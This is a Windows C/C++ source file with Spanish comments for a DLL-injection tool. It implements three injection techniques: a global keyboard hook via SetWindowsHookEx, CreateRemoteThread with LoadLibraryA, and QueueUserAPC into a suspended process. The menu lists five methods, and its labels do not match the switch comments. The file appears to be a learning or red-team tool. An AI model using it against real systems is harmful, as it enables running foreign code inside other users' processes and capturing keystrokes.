#include <stdio.h>
#include <windows.h>
#include <iostream>

/*
    Nota: Si el proceso objetivo es x64, la DLL y el proceso inyector también deben estar preparadas para esta plataforma
*/
int getMethod() {
    int method;
    printf("Select DLL Injection \n(1=SetWindowsHooxEx, 2=CreateRemoteThread, 3=QueueUserAPC, 4=ShellCodeReflectiveDllInjection, 5=CreateThreadEx): ");
    scanf_s("%d", &method);
    return method;
}
/*
HANDLE getProcess() {
    int processId;
    printf("Id del proceso objetivo: ");
    scanf_s("%d", &processId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
        printf("No se pudo abrir el proceso objetivo\n");
        exit(0);
    }
    return hProcess;
}*/

void injSetWindowsHookEx() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    // Cargamos la dll
    HMODULE dll = LoadLibraryA((LPCSTR)dllPath);
    if (dll == NULL) {
        printf("No se encontro la DLL.\n");
        exit(EXIT_FAILURE);
    }

    // Obtenemos la direcci�n de la funci�n dentro de la dll
    HOOKPROC address = (HOOKPROC)GetProcAddress(dll, "meconnect");

    // Hookeamos la funci�n
    HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, address, dll, 0);
    getchar();
    UnhookWindowsHookEx(handle);
}

void injCreateRemoteThread() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    int processId;
    printf("Id del proceso objetivo: ");
    scanf_s("%d", &processId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
        printf("No se pudo abrir el proceso objetivo\n");
        exit(0);
    }

    // Asignamos memoria en el proceso objetivo
    PVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Remote memory: %p\n", remoteMemory);

    // Escribimos el nombre de la dll que queremos que el proceso objetivo cargue
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(hProcess, remoteMemory, dllPath, sizeof(dllPath), &bytesWritten);
    if (bytesWritten == 0) {
        printf("\nNo se pudo inyectar el path de la DLL en el proceso objetivo\n");
        exit(EXIT_FAILURE);
    }

    // Creamos un thread que invoca loadlibrary en el proceso destino
    DWORD threadId = 0;
    HANDLE threadHandle = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, 0, &threadId);
    if (threadHandle == 0) {
        DWORD err = GetLastError();
        printf("\nNo se pudo crear el hilo de ejecucion en el proceso objetivo\n");
        exit(EXIT_FAILURE);
    }
}

void injQueueUserApc() {
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    char processName[255];
    printf("Path del proceso objetivo: ");
    scanf_s("%s", processName, sizeof(processName));

    SIZE_T dllPathSize = sizeof(dllPath);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    CreateProcessA(processName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    WriteProcessMemory(victimProcess, shellAddress, dllPath, dllPathSize, NULL);
    DWORD res = QueueUserAPC((PAPCFUNC)LoadLibraryA, threadHandle, (ULONG_PTR)shellAddress);
    if (res == 0) {
        DWORD err = GetLastError();
    }

    ResumeThread(threadHandle);
}

int main() {
    int method = getMethod();

    switch (method) {
    case 1: //SetWindowsHookEx
        injSetWindowsHookEx();
        break;
    case 2: //CreateRemoteThread
        injCreateRemoteThread();
        break;
    
    case 3: //ShellCodeReflectiveDllInjection
        injQueueUserApc();
        break;
    }
	return 0;
}